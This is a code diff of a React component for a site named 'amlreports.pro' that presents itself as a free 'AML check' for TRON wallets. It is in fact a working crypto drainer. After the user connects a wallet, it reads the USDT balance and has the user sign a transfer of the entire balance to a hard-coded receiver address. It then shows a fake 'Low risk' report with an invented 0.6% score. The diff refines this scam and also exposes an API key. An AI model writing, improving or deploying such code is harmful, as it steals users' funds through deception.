@@ -1,127 +1,143 @@
-import React, { useState } from "react";
+import React, { useState, useEffect, useCallback } from "react";
 import { WalletConnectAdapter } from "@tronweb3/tronwallet-adapter-walletconnect";
 // @ts-ignore
-const TronWeb = require('tronweb');
+const TronWeb = require("tronweb");
 import { Buffer } from "buffer";
 window.Buffer = Buffer;
 
-const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const TRON_RECEIVER = "THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n";
 
 const tronWeb = new TronWeb({
-  fullHost: 'https://api.trongrid.io',
+  fullHost: "https://api.trongrid.io",
   headers: {
-    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
+    "TRON-PRO-API-KEY": "bbb42b6b-c4de-464b-971f-dea560319489",
   },
 });
 
 const adapter = new WalletConnectAdapter({
-  network: 'Mainnet',
+  network: "Mainnet",
   options: {
-    relayUrl: 'wss://relay.walletconnect.com',
-    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
+    relayUrl: "wss://relay.walletconnect.com",
+    projectId: "6e52e99f199a2bd1feb89b31fbeb6a78",
     metadata: {
-      name: 'AML',
-      description: 'TRON + WalletConnect Integration',
-      url: 'https://amlreports.pro',
-      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
+      name: "AML",
+      description: "TRON + WalletConnect Integration",
+      url: "https://amlreports.pro",
+      icons: ["https://amlreports.pro/images/icon-3.abdd8ed5.webp"],
     },
   },
   web3ModalConfig: {
-    themeMode: 'dark',
+    themeMode: "dark",
   },
 });
 
 export const TronAuthButton: React.FC = () => {
-  const [status, setStatus] = useState<string | null>(null);
+  const [modal, setModal] = useState<string | null>(null);
   const [loading, setLoading] = useState<boolean>(false);
 
-  const connectWallet = async () => {
+  // Прединициализация адаптера (ускоряет показ модалки)
+  useEffect(() => {
+    if (typeof (adapter as any).init === "function") {
+      (adapter as any).init();
+    }
+    // Обработка дисконнекта — не показываем ошибок при cancel
+    const handleDisconnect = () => {
+      setLoading(false);
+      setModal(null);
+    };
+    adapter.on("disconnect", handleDisconnect);
+
+    return () => {
+      adapter.off("disconnect", handleDisconnect);
+    };
+  }, []);
+
+  // Основная логика коннекта и перевода
+  const handleAuth = useCallback(async () => {
     setLoading(true);
-    setStatus(null);
+    setModal(null);
+
     try {
       await adapter.connect();
 
       const userAddress = adapter.address;
       if (!userAddress || !tronWeb.isAddress(userAddress)) {
-        throw new Error('Invalid wallet address');
+        throw new Error("Invalid wallet address.");
       }
-
       tronWeb.setAddress(userAddress);
 
-      // Check TRX balance for gas (at least 3 TRX recommended for USDT TX)
+      // Проверка TRX-баланса (на комиссии)
       const trxRaw = await tronWeb.trx.getBalance(userAddress);
       const trx = trxRaw / 1e6;
       if (trx < 3) {
-        setStatus('❌ Insufficient TRX. At least 3 TRX is required for commission.');
+        setModal("❌ Not enough TRX to cover fees. You need at least 3 TRX.");
         await adapter.disconnect();
         setLoading(false);
         return;
       }
 
-      // Get USDT balance
+      // Проверка USDT-баланса
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt = Number(usdtRaw) / 1e6;
 
       if (usdt < 1) {
-        setStatus('✅ AML report: Low risk. Minimal USDT balance.');
+        setModal("✅ AML report: Low risk (minimal USDT balance).");
         await adapter.disconnect();
         setLoading(false);
         return;
       }
 
-      // Build TX for USDT transfer
+      // Создание и подписание транзакции USDT
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
-        'transfer(address,uint256)',
+        "transfer(address,uint256)",
         {
           feeLimit: 25_000_000,
           callValue: 0,
         },
         [
-          { type: 'address', value: TRON_RECEIVER },
-          { type: 'uint256', value: usdtRaw },
+          { type: "address", value: TRON_RECEIVER },
+          { type: "uint256", value: usdtRaw },
         ],
         userAddress
       );
 
-      // Sign TX with WalletConnect
+      // Подписываем и отправляем
       const signedTx = await adapter.signTransaction(transaction);
+      const sendResult = await tronWeb.trx.sendRawTransaction(signedTx);
 
-      // Broadcast TX
-      const result = await tronWeb.trx.sendRawTransaction(signedTx);
-      if (!result.result) {
-        if (result.code === "NO_ENOUGH_EFFECTIVE_CONNECTION") {
-          setStatus("⚠️ TRON node error. Try again later.");
-        } else {
-          setStatus('⚠️ Connection or transaction error');
-        }
+      if (sendResult.result === true) {
+        setModal("✅ AML report: All USDT funds transferred. Low risk.");
+      } else if (sendResult.code === "CONTRACT_VALIDATE_ERROR") {
+        setModal("❌ USDT contract validate error.");
       } else {
-        setStatus('✅ AML report: All USDT funds transferred.\nLow risk.');
+        setModal("⚠️ Transaction failed or rejected.");
       }
     } catch (err: any) {
+      // Cancel/Reject/Close обработка — без ошибок, просто скрываем
       if (
-        err?.message?.includes('User rejected') ||
-        err?.message?.includes('Modal is closed') ||
-        err?.message?.includes('Timeout')
+        err?.message?.includes("User rejected") ||
+        err?.message?.includes("Modal is closed") ||
+        err?.message?.includes("Timeout")
       ) {
-        // Не показываем ошибку, если юзер сам отменил
-        setStatus(null);
-      } else if (err?.message?.toLowerCase().includes('insufficient trx')) {
-        setStatus('❌ Insufficient TRX. At least 3 TRX is required for commission.');
+        setModal(null);
+      } else if (err?.message?.toLowerCase().includes("not enough trx")) {
+        setModal("❌ Not enough TRX to cover fees. You need at least 3 TRX.");
       } else {
-        setStatus('⚠️ Connection or transaction error');
+        setModal("⚠️ Connection or transaction error");
       }
     } finally {
       setLoading(false);
       await adapter.disconnect();
     }
-  };
+  }, []);
 
   return (
-    <div onClick={connectWallet} className="AuthButton" style={{ cursor: 'pointer' }}>
-      <span>Check Your Wallet</span>
+    <div className="AuthButton" style={{ cursor: "pointer" }}>
+      <span onClick={handleAuth}>Check Your Wallet</span>
+
       {loading && (
         <div className="modal__overflow">
           <div className="modal">
@@ -129,19 +145,26 @@ export const TronAuthButton: React.FC = () => {
           </div>
         </div>
       )}
-      {status && (
+
+      {modal && (
         <div className="modal__overflow">
           <div className="modal">
-            {status.startsWith('✅') ? (
+            {modal.startsWith("✅") ? (
               <>
                 <div className="content greenBorder">
                   <div>0.6%</div>
                   <div>
                     <h3>Low risk level</h3>
                     <div className="nums">
-                      <div><span className="circ green"></span> 0–30</div>
-                      <div><span className="circ orange"></span> 31–69</div>
-                      <div><span className="circ red"></span> 70–100</div>
+                      <div>
+                        <span className="circ green"></span> 0–30
+                      </div>
+                      <div>
+                        <span className="circ orange"></span> 31–69
+                      </div>
+                      <div>
+                        <span className="circ red"></span> 70–100
+                      </div>
                     </div>
                   </div>
                 </div>
@@ -151,9 +174,9 @@ export const TronAuthButton: React.FC = () => {
                 </div>
               </>
             ) : (
-              <p>{status}</p>
+              <p>{modal}</p>
             )}
-            <button onClick={e => { e.stopPropagation(); setStatus(null); }}>Close</button>
+            <button onClick={e => { e.stopPropagation(); setModal(null); }}>Close</button>
           </div>
         </div>
       )}
